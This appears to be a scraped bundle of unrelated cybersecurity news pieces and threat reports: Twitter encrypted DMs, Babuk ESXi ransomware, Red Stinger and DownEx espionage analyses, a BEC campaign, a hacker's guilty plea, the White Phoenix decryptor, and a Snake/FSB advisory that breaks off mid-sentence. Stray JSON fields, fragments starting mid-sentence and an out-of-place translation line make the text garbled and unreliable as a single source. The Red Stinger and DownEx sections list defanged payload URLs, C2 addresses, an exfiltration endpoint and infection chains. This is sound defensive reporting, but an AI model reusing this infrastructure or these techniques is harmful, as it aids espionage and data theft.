      "text": " Twitter has launched its 'Encrypted Direct Messages' feature allowing paid Twitter Blue subscribers to send end-to-end encrypted messages to other users on the platform.End-to-end encryption (E2EE) uses private and public key pairs to encrypt information sent over the internet so that only the sender and the recipient can read it.The private decryption key is only stored on the sender's device and is not shared with anyone else. However, the public encryption key is shared with others who want to send you encrypted data.As the private decryption key is only stored on the local recipient's device and never stored anywhere else along the way, such as on the messaging app's servers, even if someone intercepts the message, they won't be able to read it without the decryption key.End-to-end encrypted DMs on Twitter have been a sought-after and massively requested feature that was teased and retracted in 2018.Almost half a year later, Twitter officially announced today the availability of an encrypted messages feature on the latest version of the Twitter apps for iOS and Android and on the web platform.Based on the details in the announcement, which mentions using a device-generated private key and a centrally-provided public key, Twitter has implemented an asymmetric encryption scheme.\"In addition to the private-public key pairs, there is a per conversation key that is used to encrypt the content of messages.\"Although no specific or technical details like the employed encryption algorithms have been disclosed, Twitter promised to open source its E2EE implementation and publish a detailed whitepaper later in 2023.To the disappointment of many, this new security option will only be available to users who pay for a \"verified\" badge, with both conversation participants needing to be subscribed to Twitter Blue or affiliated with a verified organization for their messages to be encrypted.The chat interface on eligible users now offers an 'Encrypted Direct Messages' toggle so they can easily switch modes at any time.Users may resume existing conversations in E2EE mode by entering the previous message exchange, clicking on the information icon, and then selecting \"Start an encrypted message.\"\"Free\" Twitter users will not have the option to use 'Encrypted Direct Messages,' defaulting to the standard unencrypted communications.Apart from leaving non-paying users out, Twitter has also informed of some limitations, like not being able to send encrypted messages to groups, only supporting text and links (no media), not allowing new devices to join existing encrypted conversations, and only allowing a maximum of 10 registered devices per user.Twitter also notes that the security of the private key, which remains on the device at all times, is crucial to protect the integrity of the new E2EE messaging system.As, if an attacker steals that key, they may use it to decrypt all encrypted messages sent and received by the breached device."

      "text": " Freelance JournalistAn increasing number of threat actors have been observed using the leaked Babuk code from 2021 to create a new form of ransomware targeting VMware ESXi hypervisor environments.The researchers also said that malware tools built using the leaked source code enabled individuals to attack Linux systems even if they do not have the skills to create a functional program from scratch.“Due to the prevalence of ESXi in on-prem and hybrid enterprise networks, these hypervisors are valuable targets for ransomware,” wrote SentinelOne cybersecurity expert Alex Delamotte.“Over the past two years, organized ransomware groups adopted Linux lockers, including ALPHV, Black Basta, Conti, Lockbit, and REvil.”“These groups focus on ESXi before other Linux variants, leveraging built-in tools for the ESXi hypervisor to kill guest machines, then encrypt crucial hypervisor files,” Delamotte added.After analyzing the leaked Babuk source code, SentinelOne discovered similarities with ESXi lockers linked to Conti and REvil. “We also compared them to the leaked Conti Windows locker source code, finding shared, bespoke function names and features.”In addition to these known groups, SentinelOne found smaller ransomware operations using the Babuk source code to generate more recognizable ESXi lockers. According to SentinelOne, the fact that threat actors with fewer resources are also using the Babuk code particularly indicates this trend’s growth.“Based on the popularity of Babuk’s ESXi locker code, actors may also turn to the group’s Go-based NAS locker. Golang remains a niche choice for many actors, but it continues to increase in popularity,” Delamotte concluded.“The targeted NAS systems are also based on Linux. While the NAS locker is less complex, the code is clear and legible, which could make ransomware more accessible for developers who are familiar with Go or similar programming languages.”Editorial image credit: IgorGolovniov / Shutterstock.com"

Given this context, it would not be surprising that the cybersecurity landscape between these two countries has also been tense. While looking for activities from the usual suspects, one of our former coworkers at Malwarebytes Threat Intelligence Team discovered a new interesting lure that targeted the Eastern Ukraine region and reported that finding to the public. Moreover, we started tracking the actor behind it, which we internally codenamed Red Stinger.Our investigation could be helpful to the community as we will provide new undisclosed data about the group. We have identified attacks from the group starting in 2020, meaning that they have remained under the radar for at least three years. Additionally, we will provide insights into the latest campaigns performed by Red Stinger, where we have found that the group has targeted entities in different places of Ukraine.Military, transportation and critical infrastructure were some of the entities being targeted, as well as some involved in the September East Ukraine referendums. Depending on the campaign, attackers managed to exfiltrate snapshots, USB drives, keyboard strokes, and microphone recordings.Finally, we will reveal unknown scripts and malware run by the group in this report.In fact, this is the attack that Kaspersky analyzed in its blog. However, this was not the only activity carried out by the group. Malwarebytes has identified multiple operations, first dated in 2020. The next infographic shows some of the operations recognized by us:Operations performed by Red StingerSince our investigation started in September 2022, information about the initial campaigns has been limited. However, the actor’s tactics, techniques, and procedures (TTPs) are very distinctive, which gives us a high level of confidence in our attribution.The first operation we know of happened in December 2020. Although the infection chain is similar to what was already reported, the attackers were using a slightly different process back in 2020:An MSI file is downloaded from hxxp://91.234.33.185/f8f44e5de5b4d954a83961e8990af655/update.msi. This first MSI file, when executed, will show the following error to the user:In the background, this MSI file will execute a .vbs file that runs a dll file. The content is encoded using base64:So finally, cachelib.dll will be executed. That file will drop two files named iesync.so and iesync.vbs.After that, the iesync.vbs file will apply a XOR operation to iesync.so. After applying that conversion to the file, we can see that this file is what we called DBoxShell (also called PowerMagic by Kaspersky):A valid translation of this document would be:RESOLUTIONdated March 25, 2021 No. 584-NSLuganskOn consideration in the second reading of the draft lawof the Luhansk People’s Republic dated March 19, 2021 No 417-PZ / 21-3“On Amendments to the Law of the Luhansk People’s Republic“On physical culture and sports”ПОСТАНОВЛЕНИЕ № 583-НС.zip contains a lnk file as well as the previous pdf. This .lnk file will download an MSI file from the url hxxp://91.234.33.108/u3/ebe9c1f5e5011f667ef8990bf22a38f7/document.msi, and from there, the attack is pretty similar as the one performed in OP#1. Just a few differences to note, for example, in this case the dll used is named libsys.dll.Also, as the image shows, paths used the folder winappstorepackage or WinStoreApps instead of CacheWidgets, that was used in OP#1. Also, the powershell script is slightly different in this case:Nevertheless, the infection phase finally used DBoxShell, as before.We have very little information about this operation, but based on the TTPs, we have identified overlapping techniques with both previous and subsequent attacks.MSI files usage is a known signature from the group. Also, the MSI file was downloaded from hxxp://185.230.90.163/df07ac84fb9f6323c66036e86ad9a5f0d118734453342257f7a2d063bf69e39d/attachment.msi. Note the common pattern in urls.185.230.90.163 belongs to ASN number 56485. All IPs used from 2020 till now belong to the same ASN.VT telemetry showed common patterns with OP#2.After the war began, we collected information about two distinct operations.  OP#4 is perhaps one of the most interesting attacks performed by the group. As you can see in the following lines, this attack still has some characteristics that led us to attribute it to Red Stinger. Furthermore, the attack has some unique features that make it stand out as one of the most interesting ones.In this case, the group used hxxp://176.114.9.192/11535685AB69DB9E1191E9375E165/attachment.msi to download the malicious MSI file. Note once more this common pattern in all URLs used by the group. This MSI file contained a PDF, a .vbs file, and a .dat file:The group followed a similar infection chain as in previous operations. Finally, a .vbs file was responsible for XORing and executing a .dat file, which contained a small loader and a variant of DBoxShell:DBoxShell is malware that utilizes cloud storage services as a command and control (C&C) mechanism. This stage serves as an entry point for the attackers, enabling them to assess whether the targets are interesting or not, meaning that in this phase they will use different tools.A better look of how RedStinger operates can be seen in the next infographic:Common pattern in Red Stinger operationsAfter the infection phase, we are aware that actors dropped at least the following artifacts:In the reconnaissance phase, we noticed the execution of 2 MSI files named SolarTools.msi and Solar.msi. Both had inside tools named ngrok.exe and rsockstun.exe:Rsockstun is a tool that allows attackers to route connections through external proxies.More important, we have seen the same version of Solar.msi (02f84533a86fd2d689e92766b1ccf613) on OP#4 and OP#5, allowing us to connect the dots between these two attacks.In addition to SolarTools, starting the exfiltration phase, we also found another file named vs_secpack.msi. This file contains two files: ntinit.exe and ntuser.dat, which will be located under c:/ProgramData/NativeApp. Ntinit.exe is a file that was developed as a Windows Service, named ntmscm.Inside that service, eventually a thread will be executed. This thread contains all the functionality. Its main purpose is to execute one of the binaries hidden inside ntuser.dat, after some parsing. Also, it will execute C:/ProgramData/user.dat, if found.Ntuser.dat is an aggregation of PE files with a leading header and a final chunk. These executables are xored, each one with a different value. The next image shows the header:This header can be seen as a C structure, defined like this:struct head_FirstChunk{    DWORD signature;    DWORD osInstallDate;    int sizeMz1;    int sizeMz2;    int sizeMz3;    int sizeMz4;    int sizeConfig;    DWORD xorValsMZ1;    DWORD xorValsMZ2;    DWORD xorValsMZ3;    DWORD xorValsMZ4;}Following this header, four PE files are stored consecutively and XORed. As the previous structure shows, the size and XOR value used to decode these files can be recovered from the header.We won’t analyze all MZs one by one, as we want to avoid overwhelming the reader with technical details that are out of scope. For a quick reference, the first MZ was a copy of ntinit.exe and the second was a dll capable of injecting files using the Process Doppelganging technique. Curiously, InjectorTransactedHollow.dll string was found inside the binary, so possibly that was how attackers named the file originally:The third was also used for injection purposes. The fourth was the most interesting, because it communicates with a new Dropbox account. Some of these will be injected or used to inject MZs into legitimate process mobisync.exeFinally, the last chunk of ntuser.dat was a configuration file. The configuration was encrypted, and looked like this:That configuration was encrypted using AES. The IV is the first 16 bytes of the config. The key can be recovered from the fourth MZ. In fact, this executable will use this configuration to communicate with Dropbox.Decrypted configuration is shown next:This configuration is pretty representative of the group’s motivation. First of all, we see a new Dropbox account being used. This Dropbox account will be used to gather exfiltrated victims data. It can be seen like the exfiltration phase starts here. Note that attackers will use one account for reconnaissance and a different one for exfiltration.The object field was also revealing. It contained a Russian name (redacted for privacy) followed by the DNR letters (probably Donetskaya Narodnaya Respublika, referring to one of the cities declared independent in 2014, and a known target to the group). Victimology will be discussed later.OP#5 was the last known activity we will cover. As Kaspersky already revealed some technical details about this operation, we won’t repeat that analysis again. A link to the analysis made by them can be found at the beginning of this report.What we can do here is provide some extra insights regarding the attack. Let’s start at the Reconnaissance phase. Reconnaissance phase starts right after DBoxShell / GraphShell is executed. This is the GraphShell version used in OP#5:The way GrapShell works is pretty simple, and also can be almost guessed by viewing the image. A folder tree is created:Root       ___ AmazonStore                             ___ clients                             ___ tasks                             ___resultsAnd as DBoxShell does, clients will hold heartbeats from clients, tasks will store tasks that will be executed at some point by victim systems, and results will be uploaded to results.As we were actively tracking the actors for a while, we managed to recover most of the actions performed by the attackers at this phase:Support app usedDate (UTC)Event 2022-09-23Investigation starts 2022-09-24T02:53Документи (Documents) folder is created in OneDrive 2022-09-24T02:53Програми (Programs) folder is created in OneDrive 2022-09-24T02:53JimmyMorrison43 folder is created under Documents, in OneDrive 2022-09-24T02:54Робочий стіл (Desktop) folder is created in OneDriveListFiles2022-09-24T10:25Attackers sent a command to victim #1.

However, at the time we began monitoring, we still had information about two victims. Surprisingly, these two victims were located in central Ukraine. This is interesting because all the information had previously pointed to East Ukraine, where the Donbass region is located.One of the victims was a military target, but the activity on this target was only carried out for a few hours. We have reason to believe that the user noticed something wrong, and executed an antimalware solution shortly after being infected, which likely detected and cleaned the system. As far as we know, attackers managed to exfiltrate on this target several screenshots, microphone recordings and some office documents.The other victim we found was located in Vinnitsya. Target was an officer working in critical infrastructure. Attackers made a great and long surveillance of this victim, which extended until Jan 2023. They have exfiltrated screenshots, microphone and office documents, but also keystrokes were uploaded.With the victimology shared in OP#4, we may think that this was a group targeting only UA-aligned entities. However, the analysis of OP#5 revealed an interesting fact: it mainly targeted RU-aligned entities.Two victims attacked in OP#5 were workers at Yasinovataya Administration (Donetsk). Another victim was also part of DPR administration, in Port Mariupol. All of them were performing different activities regarding elections. We also have found one victim holding the advisor position from CEC (Central Election Commission). According to Wikipedia, “The Central Election Commission of the Russian Federation (Russian: Центральная избирательная комиссия Российской Федерации, abbr. ЦИК, also Центризбирком) is the superior power body responsible for conducting federal elections and overseeing local elections in the Russian Federation”.Central Election Commission of the Russian Federation (CIK) stampRegarding CEC, we had seen another victim codenamed CIK_03D502E0. CIK is also another term that could refer to CEC. Attackers showed great interest in this one, as this victim was one of the only ones with its own name (some were just identified by using a drive ID). Also, USB drives from that victim were uploaded. Next image shows a small fraction of filenames exfiltrated by the attackers. To clarify, TИK probably stands for TEC (Territorial Election Commision).Reconnaissance phase also revealed some nice info. DNS records obtained from another victim showed mail.gorod-donetsk.org, pop.gorod-donetsk.org, which could suggest that the victim was part of DPR administration. From that same victim, those DNS records revealed connections against xn--j1ab.xn--b1adbccegehv4ahbyd6o2c.xn--p1ai (лк[.]лидерывозрождения[.]рф) translate Revival Leaders. That website was created “in behalf of Putin”, and is a contest to find potential leaders and fill out positions at Kherson, Zaporozhye, DPR and Lugansk. It is unclear which positions will be filled by that, but winners were promised to get 1.000.000 rubles for a personally chosen training program in the Russian Federation.In addition to the victims involved in the September referendums, we also identified two other victims that did not seem to be related to the elections. One of them appeared to be related to the transportation ministry or equivalent, codenamed by the attackers as ZhdDor, which could be translated as “railroad.” We also found additional data that suggested that the attackers could be interested in transportation.Furthermore, we discovered that a library in Vinnitsya was infected in OP#5. Although this victim was UA-aligned, we do not understand why it was a target, especially since it was the only UA entity targeted in OP#5. However, it is worth noting that in OP#4, an entity located in Vinnitsya was also targeted.Finally, we have 2 victims named TstSCR and TstVM. It turns out that attackers, at some point, infected their own machines in order to carry out some testing, or by mistake.This first image is a good example of that. First of all, we noticed that the keyboard language was set to ENG, which is unexpected. This may suggest that the group was composed of native English speakers. However, we find it strange because of the way they named the project folder (internet_WORK). We cannot be certain, but we believe that no native speaker would use that naming convention.This second image is also nice to show. As you may notice, this is the source code of the file Overall.exe (reported by researchers), while being debugged. Also, some of the victim folders we named in this report are shown as part of the sources.For the account TstVM we choose this screenshot. In this case, attackers were developing a tool they use to tunnel victim communications. It can be seen (redacted) how source code reveals external IP addresses used by them, as some internal ones, naming for machines that we have not redacted and even passwords.Analysis of these machines also revealed the usage of the application AdvOr, used for tunneling communications through TOR.In this case, attributing the attack to a specific country is not an easy task. Any of the involved countries or aligned groups could be responsible, as some victims were aligned with Russia, and others were aligned with Ukraine.What is clear is that the principal motive of the attack was surveillance and data gathering. The attackers used different layers of protection, had an extensive toolset for their victims, and the attack was clearly targeted at specific entities. Perhaps in the future, further events or additional activity from the group can shed light on the matter.Malwarebytes EDR and MDR remove all remnants of ransomware and prevent you from getting reinfected.

      "title": "Deep Dive Into DownEx Espionage Operation in Central Asia",
      "text": " \n         May 10, 2023\n      By sharing this information, we hope to raise awareness about the current threat landscape and help public and private organizations to protect themselves. The domain and IP addresses involved do not appear in any previously documented incidents, and the malware does not share any code similarities with previously known malicious software. Since this appears to be a new malware family, we named it DownEx.By analyzing indirect indicators such as the specific targets of the attacks, the document metadata impersonating a real diplomat, and the primary focus being on data exfiltration, we can make an educated guess that a state-sponsored group is responsible for these incidents. Despite trying various methods, we have been unable to attribute these attacks to a specific threat actor. One clue pointing at the origin of the attack is the use of a cracked version of Microsoft Office 2016 popular in Russian-speaking countries (known as “SPecialisST RePack” or “Russian RePack by SPecialiST). It is also unusual to see the same backdoor written in two languages - this practice was previously observed with group APT28 (Russian-based) with their backdoor Zebrocy. Based on a combination of indicators we are attributing this campaign to a group associated with Russia, albeit with low confidence.While the initial infection vector remains unclear, we expect that threat actors used social engineering techniques to deliver a spear-phishing email with a malicious payload. The attack used a simple technique of using an icon file associated with .docx files to masquerade an executable file as a Microsoft Word document. The attachment file did not use double-extension (commonly detected as a suspicious practice) and was simply named “! to <redacted> embassy kazakh 2022.exe”. Unfortunately, it seems that email remains an effective route for delivering malicious payloads in 2023. This executable is a self-contained loader. After executing this attachment, two files are extracted to disk and executed: The extracted Word document is a simple disguise and designed as a way for the attacker to not raise suspicion while the malicious script ran in the background. Fig 1: The extracted Word document is inconspicuous and seemed to be designed only as a way for the attacker to not raise suspicion while the malicious script ran in the background. The second file log is extension-less HTA file (normally .hta) with embedded VBScript code. HTA stands for \"HTML Application\" and it is a file type that contains VBscript, HTML, CSS, or JavaScript code that can be executed as a standalone application on a Windows operating system. HTA was a popular method for sysadmins to add basic user interface to their scripts or create simple utility programs.The download of the next stage failed, and we have not been able to retrieve the payload from the command and control (C2) server. Based on our analysis of similar attacks, we expect threat actors tried to download backdoor to establish persistence. Several other tools located on the victim’s machine were used to establish connection to the C2 server. In the next section, we document our analysis of these tools and scripts. To establish communication loop with the C2 infrastructure, threat actors deployed Python-based backdoor help.py located in the folder C:\\ProgramData\\python\\tools\\scripts. The threat actors took an extra effort to make this script hard to analyze. The script was protected by PyArmor, a Python obfuscation tool that can help protect scripts from reverse engineering and tampering. We were able to retrieve the corresponding Pytransform.pyd module. This compiled module (basically a DLL file used by Python script) was protected by the Themida software protection tool, and multiple obfuscation techniques including opcode mixing have been used. Through considerable effort, we were able to analyze this script, and reverse engineer the C2 communication protocol and the structure of the script. The C2 can respond with specific tasks to perform on compromised machine. The task contains following values:The tasks are represented by a Python class, having the form “class A<number>”. During our monitoring, we have observed the 4 distinct tasks, but we are confident there are more task types: After victim finish processing the tasks, it communicates back to the C2 server using the following JSON structure: It is important to mention that nothing prevents threat actors from delivering Python code directly instead of using class constructs. During our investigation, we have identified multiple samples of new malware written in C++. The executable diagsvc.exe was stored in folder C:\\\\ProgramData\\\\Programs and is designed for files exfiltration. Fig 2: Different approaches to establishing the C2 connection One of the samples included a PDB string “C:\\Projects\\DOWN\\Release\\DOWN.pdb”. PDB (Program DataBase) is a file format used by Microsoft Visual Studio for storing debugging information about an executable or DLL file. We decided to call this malware family DownEx by combining the DOWN project name with its intended purpose (Exfiltration). There were small differences between samples that we have collected – some had more debug strings, other contained strings encrypted with a simple XOR cipher. One simple (MD5:ae5d4b9c1038f6840b563c868692f2aa) did not exfiltrate data by contacting the C2 server directly, instead it created and executed a VBScript C:\\\\ProgramData\\\\Temp\\\\driver.vbs responsible for exfiltration. All collected samples contacted the same C2 server located at 84.32.188[.]123. After execution, DownEx starts recursively parsing both local and network drives and collects the files with the following extensions: Threat actors are interested in confidential files like .pgp or .pem files, but also in financial data such as QuickBooks log files (.tlg extension). After the files are collected, they are exfiltrated using a password-protected zip archive. Size of uncompressed data is limited to 30 MBs for each archive. If needed, multiple archive files are generated. To limit the size of exfiltrated files, DownEx stores checksums of already exfiltrated files (CRC) to avoid duplication. The archives are exfiltrated to the C2 server by making POST request to http[:]//84.32.188[.]123/hftqlbgtg.php. During our investigation, we have discovered a VBScript-based version of DownEx (MD5:f3474c17d8c33055c28cb45a04ab484f) with the same functionality as the C++ version. This is a fileless attack – the DownEx script is executed in memory and never touches the disk. The script version of DownEx was downloaded by the encoded VBscript file slmgr.vbe from http[:]//206.166.251[.]216/www.php using a custom user agent (to identify campaign).  Fig 3: The slmgr.vbe script is downloading another script from the C2 server This attack highlights the sophistication of a modern cyberattack. Cybercriminals are finding new methods for making their attacks more reliable.  To prevent attacks like this, organizations should focus on implementing a combination of cybersecurity technologies to harden their security posture.  Technologies such as advanced malware detection with machine learning that can identify malicious scripts, email filtering, sandbox for detonation of suspicious files, network protection that can block C2 connections, and detection and response capabilities that extend beyond the endpoints to networks.  These technologies are all available with Bitdefender GravityZone.  These tools can help detect and prevent attacks, as well as limit the damage caused if an attack does occur. We would like to thank Adrian Schipor, Victor Vrabie, Cristina Vatamanu, and Alexandru Maximciuc for help with putting this advisory report together. An up-to-date and complete list of indicators of compromise is available to Bitdefender Advanced Threat Intelligence users.

      "title": "BEC Campaign via Israel Spotted Targeting Large Multinational Companies",
      "text": " An Israel-based threat group was discovered carrying out a business email compromise (BEC) campaign primarily targeting large and multinational enterprises with an average annual revenue of over $10 billion.The attackers pose as the CEO of the employee being targeted. They then pass on the communication to a second external persona, usually a mergers and acquisitions attorney, whose responsibility is to oversee the payment process.In some instances, once the attack progresses to this second stage, the attackers request the conversation shift from email to a voice call on WhatsApp to accelerate the attack — and to reduce the possibility of leaving behind an evidence trail.Historically, West Africa — and Nigeria in particular — has been the epicenter for BEC scams. Of all the attacks that Abnormal analyzed since the beginning of 2022, 74% originated in Nigeria. The next, most-common country associated with BEC attackers is the United Kingdom, where 5.8% of BEC actors are based, followed by South Africa (5.7%), and the United States (3.6%).Comparatively, countries in Asian and Middle Eastern regions, where Israel sits, are at the very bottom of the list, serving as the home base for 1.2% and 0.5% of BEC actors, respectively. \"Unfortunately, our research cannot definitively say the threat actors are Israeli — just that we have confidence they are operating out of Israel,\" says Mike Britton, CISO at Abnormal Security.Cybercriminals used to be able to get their paydays through distributing generic phishing campaigns, but as organizations have strengthened their defenses and improved security awareness among employees, criminals have adapted accordingly, becoming even more savvy in their attack techniques.\"Now, instead of generic phishing emails, we're seeing the rise of highly sophisticated, socially engineered BEC attacks that can evade detection at many organizations,\" Britton says. \"The Israel-based group's attack method is a good example of this.\"They implemented several tactics to give their emails a sense of legitimacy, improving their ability to evade detection by the human eye or by traditional email security solutions, including the targeting of senior leaders, who could reasonably be involved in a financial transaction such as the one the criminals used as their pretext.In addition to their use of two personas — a CEO and an external attorney — they spoofed email addresses using real domains.If the target organization had a DMARC policy in place that would prevent email spoofing, the BEC group updated the sending display name to still make it look as though emails were coming from the CEO.The group also translate emails into the language mainly used by the targeted organization.The report puts a spotlight on how BEC attacks are continuing to grow in prevalence, geographically, and in sophistication, such as through multi-phase attacks like this one uncovered by Abnormal Security.BEC attacks also are wreaking more severe financial devastation on their victims.\"As we saw in these attacks, the amount of money requested was significantly higher, in the range of $700,000, than we've seen historically,\" he says.\"There are now hundreds of millions of active users across tools like Slack, Zoom, and Microsoft Teams,\" he says. \"These apps are becoming increasingly attractive targets for cybercriminals looking for other entry points into an organization.\"Britton explains security awareness training for end users should continue to be an integral part of the security strategy.\"Employees must understand BEC risks and what they look like to stay diligent, but it's important to remember that humans get distracted and are susceptible to mistakes,\" he says.The best way to prevent an attack is to ensure that defenses are in place to prevent malicious attacks from landing in inboxes in the first place.New solutions that use behavioral AI to baseline normal behavior across the email environment can detect and block anomalies with greater precision, better preventing sophisticated BEC attacks from ever reaching users. \"To account for emerging threats across collaboration apps, consolidating visibility across all communications tools will significantly improve security teams' ability to detect suspicious and malicious activity — no matter where attacks originate,\" Britton says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

He pleaded guilty in a New York court earlier this week. In addition to the Twitter breaches, O’Connor's hacking group used SIM card swaps to gain access to various social media accounts, including those belonging to TikTok star Addison Rae and actress Bella Thorne, with the intention of exposing their private information. The group also used this method to steal $794,000 worth of virtual currency from a cryptocurrency company in New York.Known as “PlugwalkJoe” online, the British man now faces charges of computer intrusion, extortion, stalking, wire fraud and money laundering, which carry a maximum sentence of 20 years in prison.According to the security expert, while the conviction may be a slight deterrent to casual criminals in Western countries, it will be minor at best and will do nothing to deter cyber-criminals in countries that aren’t friendly to the West.  “While these criminal prosecutions do need to happen, they don’t address the root problems that enable these criminal activities,” Parkin added. “It’s much better to put resources into preventing the incident (better cybersecurity) than into cleaning up after the fact (investigation and prosecution).”Editorial image credit: max.ku / Shutterstock.com"

      "text": " A new 'White Phoenix' ransomware decryptor allows victims to partially recover files encrypted by ransomware strains that use intermittent encryption.Intermittent encryption is a strategy employed by several ransomware groups that alternates between encrypting and not encrypting chunks of data. This method allows a file to be encrypted much faster while still leaving the data unusable by the victim.However, according to CyberArk, which developed and published 'White Phoenix,' this tactic introduces weaknesses to the encryption, as leaving parts of the original files unencrypted creates the potential for free data recovery.CyberArk developed White Phoenix after experimenting with partially encrypted PDF files, attempting to recover text and images from stream objects.In the case of image streams, recovering them is as simple as removing the applied filters.In the case of text recovery, the restoration methods include identifying text chunks in the streams and concatenating them or reversing hex encoding and CMAP (character mapping) scrambling.After successfully recovering PDF files using the White Phoenix tool, CyberArk found similar restoration possibilities for other file formats, including files based on ZIP archives.These files using the ZIP format include Word (docx, docm, dotx, dotm, odt), Excel (xlsx, xlsm, xltx, xltm, xlsb, xlam, ods), and PowerPoint (pptx, pptm, ptox, potm, ppsx, ppsm, odp) document formats.Restoration for these file types is achieved by using 7zip and a hex editor to extract the unencrypted XML files of impacted documents and perform data replacement.White Phoenix automates all the above steps for supported file types, although manual intervention might be required in some cases.The analysts report that their automated data recovery tool should work well for the mentioned file types encrypted by the following ransomware strains:However, it is essential to note that White Phoenix will not produce good results in every case, even if it's theoretically supported.For example, if a large portion of a file has been encrypted, including its critical components, the recovered data may be incomplete or useless. Hence, the tool's effectiveness is directly linked to the extent of the damage to the file.For cases where text is stored as CMAP objects in PDF files, the recovery is only possible if neither the text nor the CMAP objects are encrypted, except for rare cases where the hex encoding matches the original character values.BleepingComputer tested White Phoenix with a small sample of ALPHV-encrypted PDF files and Play-encrypted PPTX and DOCX files and was unable to recover any data using the tool. However, CyberArk explained that this could be caused by intermittent encryption not being used in the attacks we received samples from or the files being too heavily encrypted to be properly parsed.\"Depending on the specific ransomware sample being used, different file sizes might be too encrypted to recover data from. If the following characters aren't seen in the file, it is likely fully encrypted and White Phoenix won't be able to help,\" CyberArk told BleepingComputer.For White Phoenix to work correctly, Zip/Office formats must contain the \"PK\\x03\\x04\" string in the file to be supported. In addition, PDFs need to contain \"0 obj\" and \"endobj\" strings to be partially recovered.If White Phoenix cannot find these strings, it will state that the file type is not supported, as shown below in our limited tests.While this decryptor may not work for all files, it could be very helpful for victims to attempt to recover \"some\" data from critical files.CyberArk invites all security researchers to download and try the tool and join the effort to improve it and help extend its support to more file types and ransomware strains."

Share sensitive information only on official, secure websites.\n              SearchThe Snake implant is considered the most sophisticated cyber espionage tool designed and used by Center 16 of Russia’s Federal Security Service (FSB) for long-term intelligence collection on sensitive targets. To conduct operations using this tool, the FSB created a covert peer-to-peer (P2P) network of numerous Snake-infected computers worldwide. Many systems in this P2P network serve as relay nodes which route disguised operational traffic to and from Snake implants on the FSB’s ultimate targets. Snake’s custom communications protocols employ encryption and fragmentation for confidentiality and are designed to hamper detection and collection efforts.We have identified Snake infrastructure in over 50 countries across North America, South America, Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake uses infrastructure across all industries, its targeting is purposeful and tactical in nature. Globally, the FSB has used Snake to collect sensitive intelligence from high-priority targets, such as government networks, research facilities, and journalists. As one example, FSB actors used Snake to access and exfiltrate sensitive international relations documents, as well as other diplomatic communications, from a victim in a North Atlantic Treaty Organization (NATO) country. Within the United States, the FSB has victimized industries including education, small businesses, and media organizations, as well as critical infrastructure sectors including government facilities, financial services, critical manufacturing, and communications.Download the PDF version of this report:We consider Snake to be the most sophisticated cyber espionage tool in the FSB’s arsenal. The sophistication of Snake stems from three principal areas. First, Snake employs means to achieve a rare level of stealth in its host components and network communications. Second, Snake’s internal technical architecture allows for easy incorporation of new or replacement components. This design also facilitates the development and interoperability of Snake instances running on different host operating systems. We have observed interoperable Snake implants for Windows, MacOS, and Linux operating systems. Lastly, Snake demonstrates careful software engineering design and implementation, with the implant containing surprisingly few bugs given its complexity.Following open source reporting by cybersecurity and threat intelligence companies on Snake tactics, techniques, and procedures (TTPs), the FSB implemented new techniques to evade detection. The modifications to the implant enhanced challenges in identifying and collecting Snake and related artifacts, directly hampering detection from both host- and network-based defensive tools.The effectiveness of this type of cyber espionage implant depends entirely on its long-term stealth, since the objective of an extended espionage operation involves remaining on the target for months or years to provide consistent access to important intelligence. The uniquely sophisticated aspects of Snake represent significant effort by the FSB over many years to enable this type of covert access.The FSB began developing Snake as “Uroburos” in late 2003. Development of the initial versions of the implant appeared to be completed around early 2004, with cyber operations first conducted using the implant shortly thereafter. The name Uroburos is appropriate, as the FSB cycled it through nearly constant stages of upgrade and redevelopment, even after public disclosures, instead of abandoning it. The name appears throughout early versions of the code, and the FSB developers also left other unique strings, including “Ur0bUr()sGoTyOu#”, which have publicly come back to haunt them.Unique features in early versions of Uroburos included a low resolution image of a portion of a historical illustration of an uroboros by the German philosopher and theologian Jakob Böhme. One approach to a tertiary backdoor used this image as the key. The same image had also been embedded in other Snake-related components. The image, blown up to a higher resolution, is shown below.In addition, early FSB developers of the Snake implant left portions of unique code throughout the implant which reveal inside jokes, personal interests, and taunts directed at security researchers. For instance, the “Ur0bUr()sGoTyOu#” string referenced above was replaced with “gLASs D1cK” in 2014 following some of the public cybersecurity reporting.We attribute Snake operations to a known unit within Center 16 of the FSB.  This unit more broadly operates the numerous elements of the Turla  toolset, and has subunits spread throughout Russia in a reflection of historical KGB signals intelligence operations in the Soviet Union. Snake has been a core component of this unit’s operations for almost as long as Center 16 has been part of the FSB.  The extensive influence of Snake across the Turla toolset demonstrates its impact on practically every aspect of the unit’s modern era of cyber operations.Daily operations using Snake have been carried out from an FSB facility in Ryazan, Russia, with an increase in Snake activity during FSB working hours in Ryazan, approximately 7:00 AM to 8:00 PM, Moscow Standard Time (GMT+3). The main developers were Ryazan-based FSB officers known by monikers included in the code of some versions of Snake. In addition to developing Snake, Ryazan-based FSB officers used it to conduct worldwide operations; these operations were different from others launched from Moscow or other FSB sites based on infrastructure and techniques.While the development and re-tooling of Snake has historically been done by Ryazan-based FSB officers, Snake operations were also launched from an FSB Center 16-occupied building in Moscow. Our investigations have identified examples of FSB operators using Snake to its full potential, as well as FSB operators who appeared to be unfamiliar with Snake’s more advanced capabilities. These observations serve to illustrate the difficulty in using such an advanced toolset across the various geographically dispersed teams comprising this unit within FSB Center 16.We have been collectively investigating Snake and Snake-related tools for almost 20 years, as well as other operations by this unit since the 1990s. During that time, the FSB has used Snake in many different operations, and they have demonstrated the value placed in this tool by making numerous adjustments and revisions to keep it viable after repeated public disclosures and other mitigations. Snake’s code and multiple Snake-related tools have been either a starting point or a key influence factor for a diverse range of other highly prolific implants and operational tools in the Turla family. Most notably, this has included Carbon (aka Cobra)—derived from Snake’s code base—and the similarly Snake-adjacent implant Chinch (currently known in open sources as ComRAT).We have identified Snake infrastructure in over 50 countries across North America, South America, Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake leverages infrastructure across all industries, its targeting is purposeful and tactical in nature. For instance, if an infected system did not respond to Snake communications, the FSB actors would strategically re-infect it within days. Globally, the FSB has used Snake to collect sensitive intelligence from high priority targets, such as government networks, research facilities, and journalists. As one example, FSB actors used Snake to access and exfiltrate sensitive international relations documents, as well as other diplomatic communications, from a victim in a NATO country. Within the United States, the FSB has victimized industries including education, small businesses, and media organizations, as well as critical infrastructure sectors including government facilities, financial services, critical manufacturing, and communications.The FSB typically deploys Snake to external-facing infrastructure nodes on a network, and from there uses other tools and TTPs on the internal network to conduct additional exploitation operations. Upon gaining and cementing ingress into a target network, the FSB typically enumerates 